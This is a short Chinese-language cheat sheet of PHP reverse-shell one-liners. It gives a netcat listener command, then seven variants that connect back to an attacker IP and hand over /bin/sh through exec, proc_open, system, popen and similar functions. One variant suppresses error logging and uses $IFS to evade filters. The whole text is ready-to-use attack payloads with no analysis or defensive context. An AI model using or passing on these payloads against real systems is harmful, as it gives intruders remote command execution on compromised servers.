# PHP脚本反弹shell

首先在本地监听TCP协议443端口

```
nc -lvp 443

```

然后在靶机上执行如下命令：

```php
php -r '$sock=fsockopen("10.10.10.11",443);exec("/bin/sh -i <&3 >&3 2>&3");'

```

```php
php -r '$s=fsockopen("10.10.10.11",443);$proc=proc_open("/bin/sh -i", array(0=>$s, 1=>$s, 2=>$s),$pipes);'

```

```php
php -r '$s=fsockopen("10.10.10.11",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

```

```php
php -r '$s=fsockopen("10.10.10.11",443);`/bin/sh -i <&3 >&3 2>&3`;'

```

```php
php -r '$s=fsockopen("10.10.10.11",443);system("/bin/sh -i <&3 >&3 2>&3");'

```

```php
php -r '$s=fsockopen("10.10.10.11",443);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

```

```php
php -r '$s=\'127.0.0.1\';$p=443;@error_reporting(0);@ini_set("error_log",NULL);@ini_set("log_errors",0);@set_time_limit(0);umask(0);if($s=fsockopen($s,$p,$n,$n)){if($x=proc_open(\'/bin/sh$IFS-i\',array(array(\'pipe\',\'r\'),array(\'pipe\',\'w\'),array(\'pipe\',\'w\')),$p,getcwd())){stream_set_blocking($p[0],0);stream_set_blocking($p[1],0);stream_set_blocking($p[2],0);stream_set_blocking($s,0);while(true){if(feof($s))die(\'connection/closed\');if(feof($p[1]))die(\'shell/not/response\');$r=array($s,$p[1],$p[2]);stream_select($r,$n,$n,null);if(in_array($s,$r))fwrite($p[0],fread($s,1024));if(in_array($p[1],$r))fwrite($s,fread($p[1],1024));if(in_array($p[2],$r))fwrite($s,fread($p[2],1024));}fclose($p[0]);fclose($p[1]);fclose($p[2]);proc_close($x);}else{die("proc_open/disabled");}}else{die("not/connect");}'

```

